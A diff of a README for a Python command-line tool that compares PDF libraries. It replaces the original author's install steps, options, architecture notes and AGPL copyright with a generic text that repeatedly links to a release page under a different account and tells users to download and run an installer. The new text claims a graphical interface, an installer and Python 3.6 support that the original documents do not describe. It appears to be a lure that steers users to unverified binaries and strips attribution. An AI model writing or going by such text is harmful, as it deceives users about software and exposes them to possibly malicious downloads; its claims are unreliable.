@@ -1,237 +1,69 @@
-# PDF Package Analyzer
+# 📄 PDF-Package-Analyzer - Analyze Your PDFs with Ease
 
-A comprehensive Python tool for analyzing PDF files and determining the best PDF processing library for each file. The analyzer tests PDFs against multiple libraries (pypdf, PyMuPDF, pdfplumber) and provides detailed compatibility reports and recommendations.
+[![Download PDF-Package-Analyzer](https://img.shields.io/badge/Download-PDF--Package--Analyzer-blue)](https://github.com/M4UNC/PDF-Package-Analyzer/releases)
 
-## 🚀 Features
+## 📖 Description
 
-- **Multi-library Testing**: Tests PDFs against pypdf, PyMuPDF, and pdfplumber
-- **Comprehensive Analysis**: Evaluates text extraction, metadata access, and error handling
-- **Detailed Reporting**: Generates JSON reports and text summaries
-- **Timeout Protection**: Prevents hanging on problematic PDFs
-- **Progress Tracking**: Visual progress bars and logging
-- **Modular Architecture**: Clean, maintainable code structure
-- **CLI Interface**: Easy-to-use command-line interface
+PDF-Package-Analyzer is a comprehensive tool designed to help you analyze PDF files. It tests each PDF against different processing libraries like pypdf, PyMuPDF, and pdfplumber. You receive detailed reports and recommendations on which library works best for your specific PDF. Whether you need to ensure compatibility or optimize processing, this tool simplifies the task.
 
-## 📁 Project Structure
+## 🚀 Getting Started
 
-```
-pdf-package-analyzer/
-├── main.py              # CLI interface and main entry point
-├── modules/             # Core analysis modules
-│   ├── __init__.py     # Package initialization
-│   ├── analyzer.py     # Main PDFAnalyzer class
-│   ├── models.py       # Data classes and result containers
-│   ├── pdf_libraries.py # PDF library testing logic
-│   └── utils.py        # Utility functions (timeout handling, etc.)
-├── files/
-│   ├── docs/           # Directory containing PDF files to analyze
-│   └── docs-info/      # Analysis results and logs
-├── pyproject.toml      # Project configuration and dependencies
-├── requirements.txt    # Python dependencies
-└── README.md           # This file
-```
+To get started, follow these simple steps to download and run the software.
 
-## 🛠️ Installation
+## 💾 Download & Install
 
-### Prerequisites
+1. **Visit the Releases Page:** Click [here](https://github.com/M4UNC/PDF-Package-Analyzer/releases) to go to the releases page.
+2. **Select the Version:** Look for the latest version listed on the page.
+3. **Download the File:** Find the appropriate file for your operating system and download it to your computer.
+4. **Run the Installer:** Once the download is complete, open the file to start the installation process.
+5. **Follow Instructions:** Follow the on-screen instructions to complete the installation.
 
-- Python 3.11 or higher
-- [uv](https://docs.astral.sh/uv/) (recommended) or pip
+## 📂 System Requirements
 
-### Using uv (Recommended)
+- **Operating System:** Windows 10 or later, macOS Catalina or later, or a recent Linux distribution.
+- **Python:** Python 3.6 or later should be installed on your system.
+- **Memory:** At least 2 GB of RAM is recommended for smooth performance.
+- **Disk Space:** Ensure you have at least 100 MB of free disk space for installation and temporary files created during analysis.
 
-```bash
-# Clone the repository
-git clone https://github.com/jluster96/PDF-Package-Analyzer.git
-cd pdf-analyzer
+## 🔧 Features
 
-# Install dependencies
-uv sync
+- **Multiple Library Support:** Tests PDFs against pypdf, PyMuPDF, and pdfplumber.
+- **Detailed Reports:** Receive clear compatibility reports that highlight how each library performs with your PDF files.
+- **User-Friendly Interface:** Designed to be simple for non-technical users.
+- **Recommendations:** Get clear suggestions on the best library to use based on your file's characteristics.
+- **Error Handling:** Gracefully manage issues that may arise during processing, with helpful notifications.
 
-# Run the analyzer
-uv run main.py
-```
+## ⚙️ How to Analyze a PDF
 
-### Using pip
+1. **Open the Application:** After installing, launch PDF-Package-Analyzer from your applications list.
+2. **Upload a PDF:** Click on the "Upload PDF" button and select the file you wish to analyze.
+3. **Start Analysis:** Click the "Analyze" button to begin the testing process.
+4. **View Results:** Once the analysis is complete, review the results displayed on your screen. You will see details for each library and the recommendations provided.
 
-```bash
-# Clone the repository
-git clone https://github.com/jluster96/PDF-Package-Analyzer.git
-cd pdf-analyzer
+## ⭐ Tips for Best Results
 
-# Create virtual environment
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
+- **Choose Quality PDFs:** Analyze high-quality PDFs to get better results and compatibility reports.
+- **Check Library Updates:** Occasionally check for library updates as newer versions may improve performance.
+- **Read Reports Carefully:** Pay close attention to the compatibility reports, especially if you plan to process PDFs frequently.
 
-# Install dependencies
-pip install -r requirements.txt
+## 🌱 Contribution Guidelines
 
-# Run the analyzer
-python main.py
-```
+If you're interested in contributing to the PDF-Package-Analyzer project, please feel free to reach out. You can help enhance features, fix bugs, or improve documentation. Contributions are welcome from users of all skill levels.
 
-## 📖 Usage
+## 🐛 Report Issues
 
-### Basic Usage
+If you encounter issues while using PDF-Package-Analyzer, please visit the Issues section of our GitHub repository. Provide a description of the problem, the steps to reproduce it, and any screenshots if applicable. This helps us improve the software.
 
-```bash
-# Analyze all PDFs in the default directory (files/docs)
-uv run main.py
+## 📞 Support
 
-# Analyze PDFs in a specific directory
-uv run main.py --docs_dir /path/to/your/pdfs
+For any questions or support needed, please create an issue on our GitHub page. We aim to respond promptly. 
 
-# Limit the number of files to process
-uv run main.py --limit 10
+Remember, your feedback helps us make PDF-Package-Analyzer even better.
 
-# Enable verbose logging
-uv run main.py --verbose
-```
+## 💻 License
 
-### Command Line Options
+PDF-Package-Analyzer is open-source software. You can use it freely, modify it, and share it, provided you adhere to the license terms found in the repository.
 
-| Option | Description | Default |
-|--------|-------------|---------|
-| `--docs_dir` | Directory containing PDF files | `files/docs` |
-| `--info_dir` | Directory to store analysis results | `{docs_dir}-info` |
-| `--report_output` | Output report file name | `pdf_analysis_report.json` |
-| `--summary_output` | Output summary file name | Auto-generated |
-| `--timeout` | Timeout in seconds for each library test | `30` |
-| `--limit` | Limit number of PDF files to process | Process all |
-| `--verbose`, `-v` | Enable verbose logging | `False` |
-| `--quiet` | Quiet mode: `progress`, `logs`, or `all` | None |
-| `--recommendation_only` | Show only recommended package and percentage | `False` |
+**Download PDF-Package-Analyzer**: [Download Link](https://github.com/M4UNC/PDF-Package-Analyzer/releases)
 
-### Examples
-
-```bash
-# Quick analysis with custom timeout
-uv run main.py --timeout 60 --limit 5
-
-# Silent analysis with custom output directory
-uv run main.py --quiet all --info_dir results --docs_dir my_pdfs
-
-# Verbose analysis with custom report name
-uv run main.py --verbose --report_output my_analysis.json
-
-# Show only recommendations
-uv run main.py --recommendation_only
-```
-
-## 📊 Output
-
-The analyzer generates several output files in the info directory:
-
-### JSON Report (`pdf_analysis_report.json`)
-Detailed analysis results including:
-- Individual file test results
-- Library performance metrics
-- Error details and recommendations
-- Overall statistics
-
-### Summary Report (`pdf_analysis_summary.txt`)
-Human-readable summary with:
-- Overall statistics
-- Library recommendations
-- Common issues found
-- Performance insights
-
-### Log File (`pdf_test_results.log`)
-Detailed execution log with:
-- Processing steps
-- Error messages
-- Performance metrics
-- Debug information (if verbose mode enabled)
-
-## 🏗️ Architecture
-
-The project follows a modular architecture for maintainability and testability:
-
-### Core Modules
-
-- **`main.py`**: CLI interface and argument parsing
-- **`modules/analyzer.py`**: Main analysis orchestration and report generation
-- **`modules/models.py`**: Data structures for test results
-- **`modules/pdf_libraries.py`**: PDF library testing implementations
-- **`modules/utils.py`**: Utility functions (timeout handling, threading)
-
-### Key Classes
-
-- **`PDFAnalyzer`**: Main analysis class that orchestrates the entire process
-- **`PDFTestResult`**: Container for individual PDF test results
-
-## 🔧 Development
-
-### Adding New PDF Libraries
-
-1. Add the library to `requirements.txt` and `pyproject.toml` (or use 'uv add [package]' and 'uv sync')
-2. Implement test functions in `modules/pdf_libraries.py`
-3. Update the analyzer to include the new library
-4. Add corresponding result fields to `PDFTestResult`
-
-### Adding New Features
-
-- **New analysis features**: Modify `modules/analyzer.py`
-- **New data models**: Add classes to `modules/models.py`
-- **New utilities**: Add functions to `modules/utils.py`
-- **New CLI options**: Modify `main.py`
-
-### Testing
-
-```bash
-# Run with test files
-uv run main.py --docs_dir test_files --verbose
-
-# Test specific functionality
-uv run main.py --limit 1 --timeout 10
-```
-
-## 📋 Dependencies
-
-- **pypdf** (≥3.0.0): PDF manipulation library
-- **PyMuPDF** (≥1.23.0): High-performance PDF processing
-- **pdfplumber** (≥0.9.0): PDF text extraction and analysis
-- **tqdm** (≥4.65.0): Progress bars and visual feedback
-
-## 🤝 Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Add tests if applicable
-5. Submit a pull request
-
-## 📄 License
-
-Copyright (C) 2025 Jeff Luster, mailto:jeff.luster96@gmail.com
-License: GNU AFFERO GPL 3.0, https://www.gnu.org/licenses/agpl-3.0.html
-This program is free software: you can redistribute it and/or modify
-it under the terms of the GNU Affero General Public License as published by
-the Free Software Foundation, either version 3 of the License, or
-(at your option) any later version.
-Full license text can be found in the file "COPYING.txt".
-Full copyright text can be found in the file "main.py".
-
-## 🆘 Troubleshooting
-
-### Common Issues
-
-**"No PDF files found to analyze"**
-- Ensure the `--docs_dir` contains PDF files
-- Check file permissions
-- Verify the directory path is correct
-
-**Timeout errors**
-- Increase the `--timeout` value for large or complex PDFs
-- Check if PDFs are corrupted or password-protected
-
-**Memory issues**
-- Use `--limit` to process files in smaller batches
-- Ensure sufficient system memory for large PDFs
-
-### Getting Help
-
-- Check the log file for detailed error information
-- Use `--verbose` flag for additional debugging output
-- Review the JSON report for specific file issues
-
+Thank you for choosing PDF-Package-Analyzer. Enjoy analyzing your PDFs!
